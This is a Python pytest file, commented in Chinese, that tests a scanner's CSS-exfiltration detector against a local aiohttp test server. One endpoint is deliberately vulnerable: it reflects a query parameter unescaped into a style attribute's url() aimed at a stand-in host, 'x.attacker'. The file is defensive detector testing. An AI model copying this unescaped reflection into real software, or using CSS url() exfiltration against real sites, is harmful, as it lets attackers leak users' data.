# -*- coding: utf-8 -*-
"""CssExfiltrationEngine：CSS 外泄（CSS 值上下文反射）探测引擎的本地靶场测试。

正例：q 参数被回显进 style 属性的 url() 值上下文 → 引擎应产出 finding。
反例：参数被净化（仅字母数字）后作为普通文本回显 → 引擎不得误报（fail-closed）。
运行：python -m pytest tests/test_css_exfiltration.py -v
"""
import re

import pytest
import pytest_asyncio
from aiohttp import web, ClientSession
from aiohttp.test_utils import TestServer

from vulnclaw.engines.web_advanced_engines import CssExfiltrationEngine


def _build_app():
    # 正例：q 直接回显进 style 属性的 url() 值上下文（无过滤）
    async def _search(request):
        q = request.query.get("q", "")
        return web.Response(
            text=f'<html><body><div style="background-image:url(https://x.attacker/{q})">x</div></body></html>'
        )

    # 反例：净化参数（仅保留字母数字），作为普通文本回显（无 CSS 值上下文）
    async def _safe(request):
        q = request.query.get("q", "")
        clean = re.sub(r"\W", "", q)
        return web.Response(
            text=f'<html><body><div>{clean}</div></body></html>'
        )

    app = web.Application()
    app.router.add_get("/search", _search)
    app.router.add_get("/safe", _safe)
    return app


@pytest_asyncio.fixture
async def server_base():
    server = TestServer(_build_app())
    await server.start_server(host="127.0.0.1", port=None)
    try:
        yield f"http://127.0.0.1:{server.port}"
    finally:
        await server.close()


@pytest_asyncio.fixture
async def session():
    async with ClientSession() as s:
        yield s


_NORMAL = (200, "<html><body><div>x</div></body></html>", {})


@pytest_asyncio.fixture
async def engine():
    return CssExfiltrationEngine()


@pytest.mark.asyncio
async def test_css_exfil_detected_on_url_context(server_base, session, engine):
    """正例：q 反射进 style/url() 值上下文 → 必产出 finding，证据含 CSS 外泄。"""
    url = f"{server_base}/search?q=x"
    result = await engine.check(url, "q", _NORMAL, "q=x", session)
    assert result is not None, "CSS 外泄引擎未在 url() 值上下文端点检出"
    assert "CSS" in str(result.get("evidence", "")), f"证据缺少 CSS 上下文: {result.get('evidence')}"
    assert result.get("confidence"), f"missing confidence: {result}"
    assert result.get("type", "").startswith("CSS外泄"), f"type 异常: {result.get('type')}"


@pytest.mark.asyncio
async def test_css_exfil_no_false_positive_on_plain_text(server_base, session, engine):
    """反例：净化后普通文本回显（无 CSS 值上下文）→ 不得误报。"""
    url = f"{server_base}/safe?q=x"
    result = await engine.check(url, "q", _NORMAL, "q=x", session)
    assert result is None, f"CSS 外泄引擎在普通文本回显端点上误报: {result}"